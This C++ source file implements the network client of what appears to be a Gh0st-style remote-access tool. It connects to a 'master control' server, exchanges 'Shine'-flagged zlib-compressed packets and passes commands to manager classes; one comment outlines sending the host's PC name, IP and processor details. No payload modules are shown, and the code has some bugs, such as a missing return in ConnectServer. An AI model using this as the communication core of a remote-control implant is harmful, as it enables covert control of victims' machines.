#include "IOCPClient.h"
#include "zconf.h"
#include "zlib.h"


CIOCPClient::CIOCPClient()
{
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	m_ClientSocket = INVALID_SOCKET;
	m_WorkThreadHandle = NULL;

	
	m_EventHandle = CreateEvent(NULL, TRUE, FALSE, NULL);
	memcpy(m_PacketFlagData, "Shine", PACKET_FLAG_LENGTH);
	m_IsReceiving = TRUE;
}
BOOL CIOCPClient::ConnectServer(char* ServerIP, unsigned short Port)
{
	m_ClientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);    //传输层
	if (m_ClientSocket == SOCKET_ERROR)
	{
		return FALSE;
	}
	//构造sockaddr_in结构 也就是主控端的结构
	sockaddr_in	ServerAddress;
	ServerAddress.sin_family = AF_INET;               //网络层  IP
	ServerAddress.sin_port = htons(Port);
	ServerAddress.sin_addr.S_un.S_addr = inet_addr(ServerIP);
	if (connect(m_ClientSocket, (SOCKADDR *)&ServerAddress, sizeof(sockaddr_in)) == SOCKET_ERROR)
	{
		if (m_ClientSocket != INVALID_SOCKET)
		{
			closesocket(m_ClientSocket);
			m_ClientSocket = INVALID_SOCKET;
		}
		return FALSE;
	}
	m_WorkThreadHandle = (HANDLE)CreateThread(NULL, 0,
		(LPTHREAD_START_ROUTINE)WorkThreadProcedure, (LPVOID)this, 0, NULL);   //接收数据

}

DWORD WINAPI CIOCPClient::WorkThreadProcedure(LPVOID ParameterData)
{
	CIOCPClient* This = (CIOCPClient*)ParameterData;
	
	fd_set fdOld;
	fd_set fdNew;
	FD_ZERO(&fdOld);    //初始化套接字数字
	FD_ZERO(&fdNew);
	char	BufferData[MAX_RECV_BUFFER] = { 0 };   //接受数据内存

	//选择模型

	FD_SET(This->m_ClientSocket, &fdOld);         //将上线通信套接字放入到集合中

	while (This->IsReceiving())
	{
		fdNew = fdOld;
		int ReturnValue = select(NULL, &fdNew, NULL, NULL, NULL);   //这里判断是否断开连接

		if (ReturnValue == SOCKET_ERROR)  //函数发生错误
		{
			This->Disconnect();
			printf("IsReceiving 关闭 \r\n");
			break;
		}
		if (ReturnValue > 0)
		{   
			//有信号
			memset(BufferData, 0, sizeof(BufferData));
			int BufferLength = recv(This->m_ClientSocket,
				BufferData, sizeof(BufferData), 0);     //接收主控端发来的数据
			if (BufferLength <= 0)                      //对方关闭套接字 closesocket()
			{
				
				printf("WorkThreadProcedure(接收数据):主控端关闭我了\r\n");
				This->Disconnect();//接收错误处理
				break;
			}
			if (BufferLength > 0)
			{

				//BufferData[BufferLength] = '\0';
				//printf("%s\r\n", BufferData);
				//处理数据
				This->OnServerReceiving((char*)BufferData, BufferLength);   //正确接收就调用 OnRead处理 转到OnRead
			}
		}
	}
	return 0;
}





VOID CIOCPClient::Disconnect()
{
	CancelIo((HANDLE)m_ClientSocket);                        //取消在当前对象上异步请求
	InterlockedExchange((LPLONG)&m_IsReceiving, FALSE);      //通知工作线程退出的信号
	closesocket(m_ClientSocket);                             //会触发对方接收-1数据                  
	SetEvent(m_EventHandle);
	m_ClientSocket = INVALID_SOCKET;
}


CIOCPClient::~CIOCPClient()
{
	if (m_ClientSocket != INVALID_SOCKET)
	{
		closesocket(m_ClientSocket);
		m_ClientSocket = INVALID_SOCKET;
	}

	if (m_WorkThreadHandle != NULL)
	{
		CloseHandle(m_WorkThreadHandle);
		m_WorkThreadHandle = NULL;
	}

	if (m_EventHandle != NULL)
	{
		CloseHandle(m_EventHandle);
		m_EventHandle = NULL;
	}
	WSACleanup();
}
VOID CIOCPClient::OnServerReceiving(char* BufferData, ULONG BufferLength)
{
	//接到的数据进行解压缩
	try
	{
		if (BufferLength == 0)
		{
			Disconnect();       //错误处理
			return;
		}
		//以下接到数据进行解压缩
		m_InCompressedBufferData.WriteArray((LPBYTE)BufferData, BufferLength);

		//检测数据是否大于数据头大小 如果不是那就不是正确的数据
		while (m_InCompressedBufferData.GetArrayLength() > PACKET_HEADER_LENGTH)
		{
			char v10[PACKET_FLAG_LENGTH] = { 0 };
			CopyMemory(v10, m_InCompressedBufferData.GetArray(), PACKET_FLAG_LENGTH);
			//判断数据头
			if (memcmp(m_PacketFlagData, v10, PACKET_FLAG_LENGTH) != 0)
			{
				throw "Bad Buffer";
			}

			ULONG PackTotalLength = 0;
			CopyMemory(&PackTotalLength, m_InCompressedBufferData.GetArray(PACKET_FLAG_LENGTH),
				sizeof(ULONG));

			//--- 数据的大小正确判断
			if (PackTotalLength &&
				(m_InCompressedBufferData.GetArrayLength()) >= PackTotalLength)
			{

				m_InCompressedBufferData.ReadArray((PBYTE)v10, PACKET_FLAG_LENGTH);    //读取各种头部 shine

				m_InCompressedBufferData.ReadArray((PBYTE)&PackTotalLength, sizeof(ULONG));

				ULONG DeCompressedLength = 0;
				m_InCompressedBufferData.ReadArray((PBYTE)&DeCompressedLength, sizeof(ULONG));


				ULONG CompressedLength = PackTotalLength - PACKET_HEADER_LENGTH;
				PBYTE CompressedData = new BYTE[CompressedLength];
				PBYTE DeCompressedData = new BYTE[DeCompressedLength];


				if (CompressedData == NULL || DeCompressedData == NULL)
				{
					throw "Bad Allocate";

				}

				m_InCompressedBufferData.ReadArray(CompressedData, CompressedLength);
				int	ReturnLength = uncompress(DeCompressedData,
					&DeCompressedLength, CompressedData, CompressedLength);


				if (ReturnLength == Z_OK)//如果解压成功
				{
					m_InDeCompressedBufferData.ClearArray();
					m_InDeCompressedBufferData.WriteArray(DeCompressedData,
						DeCompressedLength);

					//解压好的数据和长度传递给对象Manager进行处理 注意这里是用了多态
					//由于m_pManager中的子类不一样造成调用的OnReceive函数不一样

					delete[] CompressedData;
					delete[] DeCompressedData;
				
					m_ManagerObject->PacketHandleIO((PBYTE)m_InDeCompressedBufferData.GetArray(0),
						m_InDeCompressedBufferData.GetArrayLength());
				}
				else
				{
					delete[] CompressedData;
					delete[] DeCompressedData;
					throw "Bad Buffer";
				}

			}
			else
				break;
		}
	}
	catch (...)
	{
		m_InCompressedBufferData.ClearArray();
		m_InDeCompressedBufferData.ClearArray();
	}

}
int CIOCPClient::OnServerSending(char* BufferData, ULONG BufferLength)  //HelloWorld
{
	m_OutCompressedBufferData.ClearArray();

	if (BufferLength > 0)
	{

		unsigned long	CompressedLength = (double)BufferLength * 1.001 + 12;   
		LPBYTE			CompressedData = new BYTE[CompressedLength];

		if (CompressedData == NULL)
		{
			return 0;
		}

		int	ReturnValue = compress(CompressedData, &CompressedLength, (PBYTE)BufferData, BufferLength);

		if (ReturnValue != Z_OK)
		{
			delete[] CompressedData;
			return FALSE;
		}

		ULONG PackTotalLength = CompressedLength + PACKET_HEADER_LENGTH;

		//[HDR_LENGTH][0.PCName.IP.ProcessorNameString..]

		m_OutCompressedBufferData.WriteArray((PBYTE)m_PacketFlagData, sizeof(m_PacketFlagData));   //Shine

		m_OutCompressedBufferData.WriteArray((PBYTE)&PackTotalLength, sizeof(ULONG));      //CompressedLength+13

		m_OutCompressedBufferData.WriteArray((PBYTE)&BufferLength, sizeof(ULONG));            //数据长度
		m_OutCompressedBufferData.WriteArray(CompressedData, CompressedLength);


		delete[] CompressedData;
		CompressedData = NULL;

	}

	//分段发送数据
	return SendWithSplit((char*)m_OutCompressedBufferData.GetArray(), m_OutCompressedBufferData.GetArrayLength(),
		MAX_SEND_BUFFER);
}
BOOL CIOCPClient::SendWithSplit(char* BufferData, ULONG BufferLength, ULONG SplitLength)
{
	//1025
	int			 ReturnLength = 0;
	const char*  Travel = (char *)BufferData;
	int			 i = 0;
	ULONG		 Sended = 0;
	ULONG		 SendRetry = 15;
	int          j = 0;

	//  10                            3
	for (i = BufferLength; i >= SplitLength; i -= SplitLength)   //123 4567890
	{
		for (j = 0; j < SendRetry; j++)
		{
			ReturnLength = send(m_ClientSocket, Travel, SplitLength, 0);
			if (ReturnLength > 0)
			{
				break;
			}
		}
		if (j == SendRetry)
		{
			return FALSE;
		}

		Sended += SplitLength;   //Sended = 3
		Travel += ReturnLength;  //4567890   
		Sleep(15);
	}

	if (i > 0)  //1024
	{
		for (int j = 0; j < SendRetry; j++)   //nSendRetry = 15
		{
			ReturnLength = send(m_ClientSocket, (char*)Travel, i, 0);

			Sleep(15);
			if (ReturnLength > 0)
			{
				break;
			}
		}
		if (j == SendRetry)
		{
			return FALSE;
		}
		Sended += ReturnLength;   //0+=1000
	}
	if (Sended == BufferLength)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

